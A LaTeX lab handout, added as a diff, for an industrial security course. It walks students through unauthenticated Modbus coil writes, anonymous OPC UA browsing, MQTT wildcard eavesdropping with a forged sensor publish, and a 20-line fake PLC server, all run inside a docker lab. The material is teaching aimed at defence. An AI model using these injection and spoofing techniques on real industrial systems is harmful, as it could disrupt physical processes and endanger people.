@@ -1,0 +1,498 @@
+\documentclass[11pt,a4paper]{article}
+
+\def\courseTitle{Industrial Security (Bachelor)}
+\def\labNumber{04}
+\def\labTitle{Three Protocols on the Wire -- Modbus, OPC UA, MQTT}
+\def\labSection{04}
+\def\labTime{90--120 min}
+
+\input{../../../template/lab-preamble.tex}
+
+\begin{document}
+\labheader
+
+\begin{goalbox}
+Touch three industrial protocols in the same lab session and watch the
+security delta with your own eyes. Read and write Modbus without
+authentication, browse an OPC UA server in anonymous mode, publish and
+wildcard-subscribe an MQTT topic, then fill in a side-by-side comparison
+table. Stretch goal: spin up a fake PLC in 20 lines of Python.
+\end{goalbox}
+
+\section*{0 -- Mental model before you start}
+
+Three IT analogues will carry you through the whole lab. Keep them in mind
+as you run each step:
+
+\begin{itemize}[leftmargin=*, nosep]
+  \item \textbf{Modbus} $\approx$ a tiny key--value store. Sixteen-bit
+        addresses, no schema, no auth. Think Redis on a public IP with
+        no \texttt{requirepass}.
+  \item \textbf{OPC UA} $\approx$ a typed REST resource tree. Browse
+        nodes, read attributes, subscribe to changes. Think a JSON API
+        with optional mTLS -- where the lab server has the TLS turned
+        off.
+  \item \textbf{MQTT} $\approx$ a pub/sub broker. Think Kafka or Redis
+        pub/sub. The broker is the choke point: own it and you own
+        everything that flows through it.
+\end{itemize}
+
+You do not need to know any electrical engineering or ladder logic to
+finish this lab. Every ``register'', ``coil'' and ``node'' you touch is
+just a memory address with a different label on it.
+
+\section*{1 -- Pre-flight}
+
+\begin{stepbox}{1.1 -- Bring the stack up}
+From the repository root:
+\begin{lstlisting}[language=bash]
+cd bachelor/labs/_stack
+docker compose up -d
+docker compose ps
+\end{lstlisting}
+\emph{Expected:} services \texttt{openplc}, \texttt{opcua}, \texttt{mqtt},
+and \texttt{student} report \texttt{running} (and \texttt{openplc-init}
+sits in \texttt{exited (0)} once it has uploaded the demo program).
+\end{stepbox}
+
+\begin{stepbox}{1.2 -- Verify each service answers}
+\begin{lstlisting}[language=bash]
+docker compose exec student bash -c '
+  echo "--- Modbus (502/tcp)";   nc -zv 172.28.0.10 502  || true
+  echo "--- OPC UA (4840/tcp)";  nc -zv 172.28.0.11 4840 || true
+  echo "--- MQTT   (1883/tcp)";  nc -zv 172.28.0.12 1883 || true
+'
+\end{lstlisting}
+\emph{Expected:} three lines saying \texttt{open} or \texttt{succeeded}.
+If any line says \texttt{refused}, re-check \texttt{docker compose ps}
+before continuing -- nothing in the lab works without all three.
+\end{stepbox}
+
+\begin{stepbox}{1.3 -- Open a working shell in the student container}
+\begin{lstlisting}[language=bash]
+docker compose exec student bash
+\end{lstlisting}
+Everything from here on runs \emph{inside} that container unless the step
+says otherwise. The container has \texttt{python3}, \texttt{pymodbus},
+\texttt{asyncua}, \texttt{paho-mqtt}, \texttt{mosquitto\_pub}/
+\texttt{mosquitto\_sub}, \texttt{tcpdump}, and \texttt{tshark} pre-installed.
+\end{stepbox}
+
+\section*{2 -- Modbus: a key--value store with no password}
+
+\begin{stepbox}{2.1 -- Honest read of holding registers}
+Holding registers are 16-bit cells indexed 0..65535. Think of them as
+\texttt{GET key} on a Redis instance with integer keys.
+\begin{lstlisting}[language=bash]
+python3 /labs/scripts/modbus_read.py
+\end{lstlisting}
+\emph{Expected output} (freshly booted PLC):
+\begin{lstlisting}
+Registers 0..9: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+\end{lstlisting}
+Non-zero values just mean a previous lab run left state behind --
+\texttt{docker compose restart openplc} resets them.
+\end{stepbox}
+
+\begin{stepbox}{2.2 -- Capture the request on the wire}
+Start a packet capture, do one read, then stop the capture:
+\begin{lstlisting}[language=bash]
+tcpdump -i eth0 -w /labs/captures/lab04-mb.pcap port 502 &
+TCPDUMP_PID=$!
+sleep 1
+python3 /labs/scripts/modbus_read.py
+kill -INT $TCPDUMP_PID
+wait $TCPDUMP_PID 2>/dev/null
+ls -lh /labs/captures/lab04-mb.pcap
+\end{lstlisting}
+\emph{Expected:} a non-empty pcap file, typically 1--3\,KB.
+\end{stepbox}
+
+\begin{stepbox}{2.3 -- Decode the MBAP header byte by byte}
+Modbus TCP wraps the original serial PDU in a 7-byte \emph{MBAP} header.
+Use \texttt{tshark} to print one full request:
+\begin{lstlisting}[language=bash]
+tshark -r /labs/captures/lab04-mb.pcap -V -Y modbus | head -60
+\end{lstlisting}
+\emph{Expected fields} in the request:
+\begin{lstlisting}
+Modbus/TCP
+    Transaction Identifier: 1
+    Protocol Identifier:    0
+    Length:                 6
+    Unit Identifier:        1
+Modbus
+    .000 0011 = Function Code: Read Holding Registers (3)
+    Reference Number:       0
+    Word Count:             10
+\end{lstlisting}
+Now line that up with the seven MBAP bytes plus the PDU:
+\begin{center}\small
+\begin{tabular}{@{}lll@{}}
+\toprule
+\textbf{Bytes} & \textbf{Field} & \textbf{IT analogue} \\
+\midrule
+\texttt{00 01} & Transaction ID  & request correlation cookie \\
+\texttt{00 00} & Protocol ID     & always 0 for Modbus \\
+\texttt{00 06} & Length          & bytes that follow \\
+\texttt{01}    & Unit ID         & gateway / slave selector \\
+\texttt{03}    & Function code   & verb -- here ``read regs'' \\
+\texttt{00 00} & Reference no.   & start key \\
+\texttt{00 0A} & Word count      & number of keys to read \\
+\bottomrule
+\end{tabular}
+\end{center}
+There is no token, no MAC, no session ID. Anyone who can send these
+twelve bytes is ``authenticated''.
+\end{stepbox}
+
+\begin{stepbox}{2.4 -- Write without authentication}
+Function code \texttt{0x05} is \emph{Write Single Coil}. A coil is a
+1-bit output on the PLC -- in the demo program, coil \texttt{0} drives
+output \texttt{QX0.0}.
+\begin{lstlisting}[language=bash]
+python3 /labs/scripts/modbus_inject.py
+\end{lstlisting}
+\emph{Expected output:}
+\begin{lstlisting}
+Write result: WriteSingleCoilResponse(0, on)
+\end{lstlisting}
+Open the OpenPLC web UI at \texttt{http://127.0.0.1:8080} (default login
+\texttt{openplc} / \texttt{openplc}) and check the \emph{Monitoring}
+page: \texttt{QX0.0} is now \texttt{TRUE}. Nothing logged the change,
+nothing asked who you were.
+\end{stepbox}
+
+\begin{stepbox}{2.5 -- Confirm by reading back}
+\begin{lstlisting}[language=bash]
+python3 -c '
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+print("Coil 0:", c.read_coils(address=0, count=1, slave=1).bits[0])
+c.close()
+'
+\end{lstlisting}
+\emph{Expected:} \texttt{Coil 0: True}. The bit you just flipped is now
+the ground truth of the ``physical'' output -- with zero credentials.
+\end{stepbox}
+
+\begin{warnbox}
+This works because Modbus has \emph{no} authentication, not because of a
+bug. Never aim these scripts at a device you do not own. The same six
+bytes that flipped a simulated coil can trip a real breaker in a real
+substation.
+\end{warnbox}
+
+\section*{3 -- OPC UA: typed REST tree, but anonymous}
+
+\begin{stepbox}{3.1 -- Browse the namespace}
+OPC UA exposes a graph of \emph{nodes} the same way a REST API exposes a
+tree of resources. The script walks the \texttt{Objects} folder, one
+level deep:
+\begin{lstlisting}[language=bash]
+python3 /labs/scripts/opcua_browse.py
+\end{lstlisting}
+\emph{Expected output} (open62541 example server):
+\begin{lstlisting}
+Connected to: opc.tcp://172.28.0.11:4840
+ - 0:Server
+ - 1:the.answer
+ - 1:current-time
+ - 1:Demo
+\end{lstlisting}
+Node names vary slightly across open62541 versions, but \texttt{0:Server}
+(the standard root) and at least one user-namespace node
+(\texttt{ns=1:...}) must show up.
+\end{stepbox}
+
+\begin{stepbox}{3.2 -- Capture the handshake}
+\begin{lstlisting}[language=bash]
+tcpdump -i eth0 -w /labs/captures/lab04-ua.pcap port 4840 &
+TCPDUMP_PID=$!
+sleep 1
+python3 /labs/scripts/opcua_browse.py
+kill -INT $TCPDUMP_PID
+wait $TCPDUMP_PID 2>/dev/null
+ls -lh /labs/captures/lab04-ua.pcap
+\end{lstlisting}
+\emph{Expected:} a 4--15\,KB pcap.
+\end{stepbox}
+
+\begin{stepbox}{3.3 -- Read the security policy off the wire}
+OPC UA has its own dissector in Wireshark / tshark, but you have to tell
+it the port:
+\begin{lstlisting}[language=bash]
+tshark -r /labs/captures/lab04-ua.pcap \
+       -d tcp.port==4840,opcua -Y opcua -V | less
+\end{lstlisting}
+Look for the \texttt{OPN} (OpenSecureChannel) frames. The critical field
+is \texttt{SecurityPolicyURI}:
+\begin{lstlisting}
+SecurityPolicyUri:
+  http://opcfoundation.org/UA/SecurityPolicy#None
+UserIdentityToken: Anonymous
+\end{lstlisting}
+\emph{Translation:} no signing, no encryption, no client cert, no user
+name. The handshake exists, but it negotiates the empty cipher suite.
+Every \texttt{MSG} frame after the OPN -- including the browse results
+you just printed -- is plaintext.
+\end{stepbox}
+
+\begin{stepbox}{3.4 -- Why the default is ``None''}
+Why does the upstream open62541 example ship with
+\texttt{SecurityPolicy=None}? Three honest reasons that students should
+internalise:
+\begin{itemize}[leftmargin=*, nosep]
+  \item \textbf{Bootstrapping.} Mutual X.509 needs a CA, a server cert,
+        and a client cert. None of that exists out of the box.
+  \item \textbf{CPU budget.} A 200\,MHz PLC CPU can spend 10\,\% of its
+        scan cycle on one RSA-2048 handshake. That is enough to miss a
+        watchdog and trip a process.
+  \item \textbf{Interoperability.} Integrators routinely downgrade to
+        \texttt{None} to make a third-party HMI talk to a new server.
+\end{itemize}
+The protocol \emph{can} be secured (\texttt{Basic256Sha256},
+\texttt{Aes256\_Sha256\_RsaPss}, signed-and-encrypted, certificate-based
+user tokens). The lab server shows you what most field deployments
+actually look like.
+\end{stepbox}
+
+\section*{4 -- MQTT: Kafka without auth}
+
+The lab broker (\texttt{eclipse-mosquitto}) is configured with
+\texttt{allow\_anonymous true} and no ACLs. That is a faithful copy of
+the majority of internet-facing MQTT brokers on Shodan today.
+
+\begin{stepbox}{4.1 -- Subscribe to a topic, then publish into it}
+Open a \emph{second} student shell (run \texttt{docker compose exec
+student bash} again in another terminal). In one shell, subscribe:
+\begin{lstlisting}[language=bash]
+mosquitto_sub -h 172.28.0.12 -t 'sensors/vibration' -v
+\end{lstlisting}
+In the other shell, publish:
+\begin{lstlisting}[language=bash]
+mosquitto_pub -h 172.28.0.12 -t 'sensors/vibration' \
+              -m '{"v": 3.7, "ts": 1700000000}'
+\end{lstlisting}
+\emph{Expected} in the subscriber shell:
+\begin{lstlisting}
+sensors/vibration {"v": 3.7, "ts": 1700000000}
+\end{lstlisting}
+You never authenticated. The broker did not care.
+\end{stepbox}
+
+\begin{stepbox}{4.2 -- Publish a burst with the helper script}
+\begin{lstlisting}[language=bash]
+python3 /labs/scripts/mqtt_publish.py
+\end{lstlisting}
+\emph{Expected:} five JSON messages arrive in the subscriber shell, one
+every 200\,ms, the script prints \texttt{published 5 messages...} and
+exits.
+\end{stepbox}
+
+\begin{stepbox}{4.3 -- Capture and decode an MQTT exchange}
+\begin{lstlisting}[language=bash]
+tcpdump -i eth0 -w /labs/captures/lab04-mq.pcap port 1883 &
+TCPDUMP_PID=$!
+sleep 1
+python3 /labs/scripts/mqtt_publish.py
+kill -INT $TCPDUMP_PID
+wait $TCPDUMP_PID 2>/dev/null
+tshark -r /labs/captures/lab04-mq.pcap -Y mqtt -V | head -40
+\end{lstlisting}
+\emph{Expected:} you should see \texttt{CONNECT} (no \texttt{Username}
+field), one \texttt{CONNACK} with return code \texttt{0 -- accepted},
+then \texttt{PUBLISH} frames with the topic and JSON payload entirely in
+the clear. Body and headers are visible to anyone on the segment.
+\end{stepbox}
+
+\begin{stepbox}{4.4 -- Wildcard subscription = full telemetry firehose}
+MQTT topics are slash-separated paths; \texttt{\#} matches everything
+below a point in the tree, \texttt{+} matches a single level.
+
+\emph{Subscribe to the entire tree} (one shell):
+\begin{lstlisting}[language=bash]
+mosquitto_sub -h 172.28.0.12 -t '#' -v
+\end{lstlisting}
+\emph{Publish a few topics from the second shell}:
+\begin{lstlisting}[language=bash]
+mosquitto_pub -h 172.28.0.12 -t 'plant/lineA/pump1/rpm'  -m '1480'
+mosquitto_pub -h 172.28.0.12 -t 'plant/lineA/pump1/temp' -m '64'
+mosquitto_pub -h 172.28.0.12 -t 'plant/lineB/valve3/pos' -m 'OPEN'
+\end{lstlisting}
+\emph{Expected in the wildcard subscriber:}
+\begin{lstlisting}
+plant/lineA/pump1/rpm  1480
+plant/lineA/pump1/temp 64
+plant/lineB/valve3/pos OPEN
+\end{lstlisting}
+On a real broker without ACLs that single \texttt{\#} subscription is
+the entire plant's telemetry feed, in real time, in plaintext.
+\end{stepbox}
+
+\begin{stepbox}{4.5 -- Inject a forged sensor reading}
+Nothing stops an unauthenticated client from \emph{publishing} either:
+\begin{lstlisting}[language=bash]
+mosquitto_pub -h 172.28.0.12 -t 'plant/lineA/pump1/rpm' -m '99999'
+\end{lstlisting}
+The wildcard subscriber sees \texttt{plant/lineA/pump1/rpm 99999}
+indistinguishable from a real measurement. If a downstream dashboard
+trusts the broker, it just rendered a false alarm. If a control loop
+trusts the broker, it just acted on a lie.
+\end{stepbox}
+
+\section*{5 -- The conceptual climax: side-by-side comparison}
+
+\begin{stepbox}{5.1 -- Fill in the table from what you observed}
+Compare the three protocols on five dimensions. Treat the lab observations
+as evidence, not opinion.
+
+\renewcommand{\arraystretch}{1.25}
+\begin{center}\footnotesize
+\begin{tabular}{@{}p{2.4cm}p{3.3cm}p{3.3cm}p{3.3cm}@{}}
+\toprule
+\textbf{Dimension} & \textbf{Modbus TCP} & \textbf{OPC UA (default)} & \textbf{MQTT (plaintext)} \\
+\midrule
+Authentication
+  & None -- 7-byte MBAP, no token
+  & Anonymous endpoint, \texttt{SecurityPolicy=None}
+  & \texttt{allow\_anonymous true}, no ACL \\
+Integrity
+  & No MAC, no checksum beyond TCP
+  & Sign mode disabled (None policy)
+  & TCP only -- no app-layer MAC \\
+Confidentiality
+  & Cleartext on 502/tcp
+  & Cleartext after OPN
+  & Cleartext on 1883/tcp \\
+Ease of misuse
+  & 12 bytes to read or write
+  & Browse + write in 10 lines of Python
+  & One \texttt{mosquitto\_pub} command \\
+Where you'd accept it
+  & Air-gapped cell, behind a data-diode or firewall
+  & Configured with \texttt{Basic256Sha256}, mutual X.509, no anonymous endpoint
+  & TLS on 8883 + per-client ACLs + per-topic permissions \\
+\bottomrule
+\end{tabular}
+\end{center}
+\end{stepbox}
+
+\begin{stepbox}{5.2 -- IT analogues, side by side}
+Final sanity check -- if you can complete this table from memory, you
+have the model:
+
+\renewcommand{\arraystretch}{1.2}
+\begin{center}\footnotesize
+\begin{tabular}{@{}lll@{}}
+\toprule
+\textbf{OT concept} & \textbf{IT analogue} & \textbf{What goes wrong} \\
+\midrule
+Holding register   & Redis integer key      & \texttt{requirepass} not set \\
+Coil               & Boolean flag in KV     & Anyone can flip it \\
+OPC UA node        & REST resource          & API with no TLS, no auth \\
+SecurityPolicy=None & TLS-disabled HTTPS    & Hostname says https, wire does not \\
+MQTT topic         & Kafka topic            & No ACL on producer or consumer \\
+MQTT \texttt{\#}   & \texttt{SELECT *}      & One subscription = full firehose \\
+\bottomrule
+\end{tabular}
+\end{center}
+\end{stepbox}
+
+\section*{6 -- Stretch: spoof a PLC in 20 lines}
+
+\begin{stepbox}{6.1 -- Why this matters}
+Reading and writing Modbus is the obvious attack. The subtler one is
+\emph{impersonation}: spin up your own server, serve fake values, watch
+an HMI or historian accept them as ground truth. Because Modbus has no
+identity, the SCADA cannot tell your server apart from the real PLC --
+all it sees is ``something on port 502 answered with the right
+function code''.
+\end{stepbox}
+
+\begin{stepbox}{6.2 -- Write the fake server}
+Stop the real PLC's port so the fake one can bind:
+\begin{lstlisting}[language=bash]
+docker compose stop openplc
+\end{lstlisting}
+Save as \texttt{/tmp/fake\_plc.py} inside the student container
+(\texttt{vim} or \texttt{cat > /tmp/fake\_plc.py <{}<{}'EOF'}\dots\texttt{EOF}):
+\begin{lstlisting}[language=Python]
+from pymodbus.server import StartTcpServer
+from pymodbus.datastore import (
+    ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext,
+)
+
+# Fake "process": registers 0..9 lie about a sensor that reads 4242.
+block = ModbusSequentialDataBlock(0, [4242] * 100)
+slave = ModbusSlaveContext(hr=block, ir=block, co=block, di=block)
+ctx   = ModbusServerContext(slaves=slave, single=True)
+
+print("Fake PLC listening on 0.0.0.0:502 -- registers report 4242")
+StartTcpServer(context=ctx, address=("0.0.0.0", 502))
+\end{lstlisting}
+Run it:
+\begin{lstlisting}[language=bash]
+python3 /tmp/fake_plc.py
+\end{lstlisting}
+\end{stepbox}
+
+\begin{stepbox}{6.3 -- Confirm the spoof from a second shell}
+\begin{lstlisting}[language=bash]
+docker compose exec student \
+  python3 /labs/scripts/modbus_read.py
+\end{lstlisting}
+\emph{Expected output:}
+\begin{lstlisting}
+Registers 0..9: [4242, 4242, 4242, 4242, 4242,
+                 4242, 4242, 4242, 4242, 4242]
+\end{lstlisting}
+The client cannot tell. If an HMI was pointed at this IP, it would now
+display \texttt{4242} as if it were a real pump pressure. Stop the fake
+server with Ctrl-C and bring the real PLC back:
+\begin{lstlisting}[language=bash]
+docker compose start openplc
+\end{lstlisting}
+\end{stepbox}
+
+\section*{7 -- Cleanup}
+
+\begin{stepbox}{7.1 -- Tear down}
+\begin{lstlisting}[language=bash]
+exit                          # leave the student shell
+docker compose down           # keep volumes; -v also wipes them
+ls bachelor/labs/_stack/captures/
+\end{lstlisting}
+Your three PCAPs (\texttt{lab04-mb.pcap}, \texttt{lab04-ua.pcap},
+\texttt{lab04-mq.pcap}) should sit on the host -- they are mounted from
+the container.
+\end{stepbox}
+
+\begin{deliverbox}
+Hand in:
+\begin{itemize}[leftmargin=*, nosep]
+  \item All three PCAPs (Modbus, OPC UA, MQTT).
+  \item Annotated MBAP byte table (Step 2.3) -- mark every byte with its
+        meaning and the IT analogue you would compare it to.
+  \item One screenshot of the OpenPLC \emph{Monitoring} page showing
+        \texttt{QX0.0 = TRUE} after Step 2.4.
+  \item The tshark excerpt that shows \texttt{SecurityPolicy=None} and
+        \texttt{UserIdentityToken=Anonymous} from Step 3.3.
+  \item A wildcard-subscribe transcript from Step 4.4.
+  \item The filled-in side-by-side table from Step 5.1.
+  \item A one-paragraph answer: ``\emph{Which of the three protocols
+        could you put on a hostile network today, with what extra
+        controls, and why?}''
+  \item (Stretch) Source of your fake PLC plus a screenshot of the
+        client receiving \texttt{4242}.
+\end{itemize}
+\end{deliverbox}
+
+\begin{warnbox}
+Lab containers only. The injection, the wildcard subscribe, and the
+fake PLC all work because the lab broker, PLC, and OPC UA server were
+deliberately deployed with default insecure settings. Running any of
+these against equipment you do not own is, depending on jurisdiction,
+either a felony or a billable safety incident -- and often both.
+\end{warnbox}
+\end{document}
